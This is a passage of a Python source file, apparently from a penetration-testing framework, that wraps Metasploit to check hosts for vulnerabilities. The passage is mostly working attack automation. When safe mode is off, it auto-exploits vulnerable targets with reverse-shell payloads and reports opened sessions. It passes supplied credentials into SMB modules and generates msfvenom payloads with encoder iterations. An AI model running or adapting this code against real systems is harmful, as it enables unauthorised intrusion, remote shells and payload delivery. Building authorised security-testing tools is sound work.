                            confidence=0.85 if exploit.check_supported else 0.6,
                            evidence=details,
                            metadata={
                                'exploit_path': exploit.path,
                                'cve_ids': exploit.cve_ids,
                                'targets': exploit.targets,
                                'rank': exploit.rank,
                            },
                        )
                        
                        # Auto-exploit if enabled and safe mode is off
                        if auto_exploit and not self.safe_mode:
                            exploit_result = await self._execute_exploit(target, exploit, credentials)
                            if exploit_result == ExploitResult.SESSION_CREATED:
                                finding.severity = Severity.CRITICAL.value
                                finding.title += " (EXPLOITED)"
                                finding.confidence = 1.0
                        
                        findings.append(finding)
                        
            except Exception as e:
                logger.debug(f"Error checking {exploit.name}: {e}")
        
        return findings
    
    async def _check_vulnerability(self, target: str, exploit: ExploitModule,
                                   credentials: Dict = None) -> Tuple[bool, str]:
        """Check if target is vulnerable to an exploit"""
        
        if self._connected and self._client:
            return await self._check_via_rpc(target, exploit, credentials)
        else:
            return await self._check_via_cli(target, exploit, credentials)
    
    async def _check_via_rpc(self, target: str, exploit: ExploitModule,
                             credentials: Dict = None) -> Tuple[bool, str]:
        """Check vulnerability using RPC"""
        try:
            # Load module
            mod = self._client.modules.use('exploit', exploit.path.replace('exploit/', ''))
            
            # Set options
            mod['RHOSTS'] = target
            
            if credentials:
                if 'username' in credentials:
                    mod['USERNAME'] = credentials['username']
                    mod['SMBUser'] = credentials['username']
                if 'password' in credentials:
                    mod['PASSWORD'] = credentials['password']
                    mod['SMBPass'] = credentials['password']
                if 'domain' in credentials:
                    mod['DOMAIN'] = credentials['domain']
            
            # Run check
            if hasattr(mod, 'check'):
                result = mod.check()
                
                if 'vulnerable' in str(result).lower():
                    return True, str(result)
            
            return False, ""
            
        except Exception as e:
            logger.debug(f"RPC check failed: {e}")
            return False, str(e)
    
    async def _check_via_cli(self, target: str, exploit: ExploitModule,
                             credentials: Dict = None) -> Tuple[bool, str]:
        """Check vulnerability using msfconsole CLI"""
        
        # Build resource script
        rc_content = f"""use {exploit.path}
set RHOSTS {target}
"""
        
        if credentials:
            if 'username' in credentials:
                rc_content += f"set USERNAME {credentials['username']}\n"
                rc_content += f"set SMBUser {credentials['username']}\n"
            if 'password' in credentials:
                rc_content += f"set PASSWORD {credentials['password']}\n"
                rc_content += f"set SMBPass {credentials['password']}\n"
        
        rc_content += "check\nexit\n"
        
        # Write resource file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(rc_content)
            rc_file = f.name
        
        try:
            cmd = ['msfconsole', '-q', '-r', rc_file]
            stdout, stderr, returncode = await self._run_command(cmd, timeout=120)
            
            is_vulnerable = any(x in stdout.lower() for x in [
                'is vulnerable',
                'appears to be vulnerable',
                'the target is vulnerable',
            ])
            
            return is_vulnerable, stdout
            
        finally:
            os.unlink(rc_file)
    
    async def _execute_exploit(self, target: str, exploit: ExploitModule,
                               credentials: Dict = None) -> ExploitResult:
        """Execute an exploit against target"""
        
        if not self.lhost:
            logger.warning("LHOST not set, skipping exploitation")
            return ExploitResult.ERROR
        
        try:
            if self._connected and self._client:
                return await self._exploit_via_rpc(target, exploit, credentials)
            else:
                return await self._exploit_via_cli(target, exploit, credentials)
        except Exception as e:
            logger.error(f"Exploitation failed: {e}")
            return ExploitResult.ERROR
    
    async def _exploit_via_rpc(self, target: str, exploit: ExploitModule,
                               credentials: Dict = None) -> ExploitResult:
        """Execute exploit via RPC"""
        try:
            mod = self._client.modules.use('exploit', exploit.path.replace('exploit/', ''))
            
            mod['RHOSTS'] = target
            
            if credentials:
                if 'username' in credentials:
                    mod['USERNAME'] = credentials['username']
                    mod['SMBUser'] = credentials['username']
                if 'password' in credentials:
                    mod['PASSWORD'] = credentials['password']
                    mod['SMBPass'] = credentials['password']
            
            # Set payload
            if exploit.default_payload:
                payload = self._client.modules.use('payload', exploit.default_payload)
                payload['LHOST'] = self.lhost
                payload['LPORT'] = self.lport
                
                result = mod.execute(payload=payload)
            else:
                result = mod.execute()
            
            if result.get('job_id'):
                # Wait for session
                await asyncio.sleep(5)
                sessions = self._client.sessions.list
                if sessions:
                    return ExploitResult.SESSION_CREATED
                return ExploitResult.EXPLOITED
            
            return ExploitResult.ERROR
            
        except Exception as e:
            logger.error(f"RPC exploit failed: {e}")
            return ExploitResult.ERROR
    
    async def _exploit_via_cli(self, target: str, exploit: ExploitModule,
                               credentials: Dict = None) -> ExploitResult:
        """Execute exploit via CLI"""
        
        rc_content = f"""use {exploit.path}
set RHOSTS {target}
"""
        
        if credentials:
            if 'username' in credentials:
                rc_content += f"set USERNAME {credentials['username']}\n"
            if 'password' in credentials:
                rc_content += f"set PASSWORD {credentials['password']}\n"
        
        if exploit.default_payload and self.lhost:
            rc_content += f"set PAYLOAD {exploit.default_payload}\n"
            rc_content += f"set LHOST {self.lhost}\n"
            rc_content += f"set LPORT {self.lport}\n"
        
        rc_content += "exploit -j\nsleep 10\nsessions -l\nexit\n"
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(rc_content)
            rc_file = f.name
        
        try:
            cmd = ['msfconsole', '-q', '-r', rc_file]
            stdout, stderr, returncode = await self._run_command(cmd, timeout=180)
            
            if 'session' in stdout.lower() and 'opened' in stdout.lower():
                return ExploitResult.SESSION_CREATED
            elif 'exploit completed' in stdout.lower():
                return ExploitResult.EXPLOITED
            
            return ExploitResult.NOT_VULNERABLE
            
        finally:
            os.unlink(rc_file)
    
    async def _run_specific_exploit(self, target: str, exploit_name: str,
                                    credentials: Dict = None,
                                    auto_exploit: bool = False) -> List[Finding]:
        """Run a specific exploit by name"""
        findings = []
        
        # Find exploit in database
        exploit = None
        for category, exploits in EXPLOIT_DATABASE.items():
            for e in exploits:
                if e.name.lower() == exploit_name.lower() or e.path == exploit_name:
                    exploit = e
                    break
            if exploit:
                break
        
        if not exploit:
            logger.warning(f"Exploit not found: {exploit_name}")
            return findings
        
        is_vulnerable, details = await self._check_vulnerability(target, exploit, credentials)
        
        if is_vulnerable:
            finding = Finding(
                id=self._generate_id(),
                tool=self.TOOL_NAME,
                category=exploit.category.value,
                severity=self._rank_to_severity(exploit.rank),
                title=f"{exploit.name} Vulnerability Confirmed",
                description=exploit.description,
                target=target,
                cve_id=exploit.cve_ids[0] if exploit.cve_ids else '',
                confidence=0.90,
                evidence=details,
                metadata={'exploit_path': exploit.path},
            )
            
            if auto_exploit and not self.safe_mode:
                result = await self._execute_exploit(target, exploit, credentials)
                if result == ExploitResult.SESSION_CREATED:
                    finding.title += " (SESSION OBTAINED)"
                    finding.severity = Severity.CRITICAL.value
            
            findings.append(finding)
        
        return findings
    
    async def _run_auxiliary(self, module_path: str, options: Dict) -> str:
        """Run auxiliary module"""
        if self._connected and self._client:
            try:
                mod = self._client.modules.use('auxiliary', module_path.replace('auxiliary/', ''))
                for key, value in options.items():
                    mod[key] = value
                
                cid = self._client.consoles.console().cid
                output = self._client.consoles.console(cid).run_module_with_output(mod)
                return output
            except Exception as e:
                logger.debug(f"RPC auxiliary failed: {e}")
        
        # CLI fallback
        rc_content = f"use {module_path}\n"
        for key, value in options.items():
            rc_content += f"set {key} {value}\n"
        rc_content += "run\nexit\n"
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
            f.write(rc_content)
            rc_file = f.name
        
        try:
            cmd = ['msfconsole', '-q', '-r', rc_file]
            stdout, _, _ = await self._run_command(cmd, timeout=120)
            return stdout
        finally:
            os.unlink(rc_file)
    
    async def _get_sessions(self, target: str = None) -> List[Dict]:
        """Get active Metasploit sessions"""
        sessions = []
        
        if self._connected and self._client:
            try:
                all_sessions = self._client.sessions.list
                for sid, info in all_sessions.items():
                    if target is None or info.get('target_host') == target:
                        sessions.append({
                            'id': sid,
                            'type': info.get('type'),
                            'target_host': info.get('target_host'),
                            'username': info.get('username'),
                            'via_exploit': info.get('via_exploit'),
                        })
            except Exception as e:
                logger.error(f"Failed to get sessions: {e}")
        
        return sessions
    
    async def generate_payload(self, payload_type: str, lhost: str, lport: int,
                               format: str = 'exe', encoder: str = None,
                               iterations: int = 0, output_file: str = None) -> Optional[bytes]:
        """Generate a Metasploit payload"""
        
        cmd = [
            'msfvenom',
            '-p', payload_type,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', format,
        ]
        
        if encoder:
            cmd.extend(['-e', encoder, '-i', str(iterations or 1)])
        
        if output_file:
            cmd.extend(['-o', output_file])
        
        stdout, stderr, returncode = await self._run_command(cmd, timeout=60)
        
        if returncode == 0:
            if output_file:
                return None
            return stdout.encode() if isinstance(stdout, str) else stdout
        
        logger.error(f"Payload generation failed: {stderr}")
        return None
    
    def _rank_to_severity(self, rank: str) -> str:
        """Convert Metasploit exploit rank to severity"""
        rank_map = {
            'excellent': Severity.CRITICAL.value,
            'great': Severity.HIGH.value,
            'good': Severity.HIGH.value,
            'normal': Severity.MEDIUM.value,
            'average': Severity.MEDIUM.value,
            'low': Severity.LOW.value,
            'manual': Severity.LOW.value,
        }
        return rank_map.get(rank.lower(), Severity.MEDIUM.value)
    
    def _extract_version(self, output: str) -> str:
        """Extract version string from output"""
        version_patterns = [
            r'version[:\s]+([0-9.]+)',
            r'v([0-9.]+)',
            r'([0-9]+\.[0-9]+\.[0-9]+)',
        ]
        
        for pattern in version_patterns:
            match = re.search(pattern, output, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return ""
    
    def parse_output(self, raw_output: str, target: str) -> List[Finding]:
        """Parse raw Metasploit output"""
        findings = []
        
        # Look for vulnerability indicators
        vuln_patterns = [
            (r'\[!\].*vulnerable', Severity.HIGH.value),
            (r'\[\+\].*vulnerable', Severity.HIGH.value),
            (r'Host is likely VULNERABLE', Severity.HIGH.value),
            (r'session\s+(\d+)\s+opened', Severity.CRITICAL.value),
        ]
        
        for pattern, severity in vuln_patterns:
            matches = re.findall(pattern, raw_output, re.IGNORECASE)
            for match in matches:
                findings.append(Finding(
                    id=self._generate_id(),
                    tool=self.TOOL_NAME,
                    category="exploitation",
                    severity=severity,
                    title=f"Metasploit: {match}" if isinstance(match, str) else "Vulnerability Detected",
                    description="Vulnerability detected via Metasploit scan",
                    target=target,
                    evidence=match if isinstance(match, str) else raw_output[:500],
                    confidence=0.85,
                ))
        
        return findings
    
    def get_exploit_list(self, category: str = None) -> List[Dict]:
        """Get list of available exploits"""
        exploits = []
        
        categories = [AttackCategory(category)] if category else list(AttackCategory)
        
        for cat in categories:
            for exploit in EXPLOIT_DATABASE.get(cat, []):
                exploits.append({
                    'name': exploit.name,
                    'path': exploit.path,
                    'category': exploit.category.value,
                    'description': exploit.description,
                    'cve_ids': exploit.cve_ids,
                    'rank': exploit.rank,
                })
        
        return exploits


# ============= HELPER FUNCTIONS =============

def get_all_exploits() -> List[Dict]:
    """Get all available exploits"""
    scanner = MetasploitAdvancedScanner({})
    return scanner.get_exploit_list()


def get_exploits_by_category(category: str) -> List[Dict]:
    """Get exploits by category"""
    scanner = MetasploitAdvancedScanner({})
    return scanner.get_exploit_list(category)


def get_exploits_by_cve(cve_id: str) -> List[Dict]:
    """Get exploits by CVE ID"""
    exploits = []
    
    for category, exploit_list in EXPLOIT_DATABASE.items():
        for exploit in exploit_list:
            if cve_id in exploit.cve_ids:
                exploits.append({
                    'name': exploit.name,
                    'path': exploit.path,
                    'category': exploit.category.value,
                    'cve_ids': exploit.cve_ids,
                })
    
    return exploits

